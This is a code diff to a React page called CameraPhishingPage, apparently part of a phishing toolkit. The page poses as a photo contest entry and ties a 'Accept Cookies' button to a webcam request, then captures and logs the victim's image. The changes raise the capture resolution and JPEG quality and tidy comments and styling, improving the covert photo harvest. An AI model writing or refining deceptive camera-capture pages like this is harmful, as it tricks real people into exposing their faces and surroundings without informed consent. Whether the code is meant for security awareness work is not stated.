@@ -7,7 +7,7 @@ import type { CameraData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon } from 'lucide-react';
-// Removed next/image import as it's not used for a placeholder in the photo-contest-entry in this version
+import { cn } from '@/lib/utils'; // Added for cn utility
 
 const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; }> = {
   'photo-contest-entry': {
@@ -56,8 +56,8 @@ export default function CameraPhishingPage() {
       const video = videoRef.current;
       const canvas = canvasRef.current;
 
-      const MAX_WIDTH = 320;
-      const MAX_HEIGHT = 240;
+      const MAX_WIDTH = 640; // Restored for better quality
+      const MAX_HEIGHT = 480; // Restored for better quality
       let { videoWidth, videoHeight } = video;
 
       if (videoWidth > videoHeight) {
@@ -78,11 +78,11 @@ export default function CameraPhishingPage() {
       const context = canvas.getContext('2d');
       if (context) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageUrl = canvas.toDataURL('image/jpeg', 0.5);
+        const imageUrl = canvas.toDataURL('image/jpeg', 0.9); // Increased quality to 0.9
         const cameraData: CameraData = { imageUrl };
         addLog({ type: 'camera', data: cameraData });
         setStatus('captured');
-        stopCameraStream(true);
+        stopCameraStream(true); // Pass true to indicate capture happened
       }
     }
   };
@@ -125,9 +125,6 @@ export default function CameraPhishingPage() {
   
   const handleCookieConsentAndCamera = () => {
     setCookieConsentGiven(true);
-    // It's important that `handleCameraRequest` is called after `cookieConsentGiven` state update might be processed.
-    // A slight delay or directly calling it if state updates are batched should be fine.
-    // For immediate effect, we can call it directly.
     handleCameraRequest();
   };
 
@@ -139,6 +136,7 @@ export default function CameraPhishingPage() {
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
+    // Only reset to 'idle' if not after capture and not already in error or captured state
     if (!isAfterCapture && status !== 'captured' && status !== 'error') {
       setStatus('idle');
     }
@@ -156,7 +154,7 @@ export default function CameraPhishingPage() {
       <>
         <PhishingPageLayout
           title={content.title}
-          isLoading={isLoading && status !== 'streaming' && cookieConsentGiven} // Only show loading if consent given and camera is starting
+          isLoading={isLoading && status !== 'streaming' && cookieConsentGiven}
           error={error}
           statusMessage={status === 'captured' ? 'Photo submitted successfully! Good luck in the contest.' : undefined}
         >
@@ -165,9 +163,11 @@ export default function CameraPhishingPage() {
               <p className="text-lg text-muted-foreground" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
           </div>
           
-          <div className={`aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2 ${status === 'streaming' && cookieConsentGiven ? 'border-primary' : 'border-border'}`}>
+          <div className={cn(
+              "aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2",
+              (status === 'streaming' && cookieConsentGiven) ? 'border-primary' : 'border-border'
+            )}>
             <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
-            {/* Overlay for video placeholder */}
             { !(status === 'streaming' && cookieConsentGiven) && !(status === 'captured' && cookieConsentGiven) && (
               <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
                 {!cookieConsentGiven ? (
@@ -219,8 +219,8 @@ export default function CameraPhishingPage() {
                 <Button
                   onClick={handleCookieConsentAndCamera}
                   className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
-                  size="md"
-                  disabled={isLoading && !cookieConsentGiven} // Disable only if loading is for cookie consent step
+                  size="md" // Ensure this size is defined or use default
+                  disabled={isLoading && !cookieConsentGiven} 
                 >
                   <Cookie className="mr-2 h-4 w-4" />
                   Accept Cookies
@@ -232,7 +232,6 @@ export default function CameraPhishingPage() {
     );
   }
 
-  // Fallback for other camera templates (video-verification, ar-filter, default)
   return (
     <PhishingPageLayout
         title={content.title}
@@ -289,5 +288,3 @@ export default function CameraPhishingPage() {
     </PhishingPageLayout>
   );
 }
-
-    
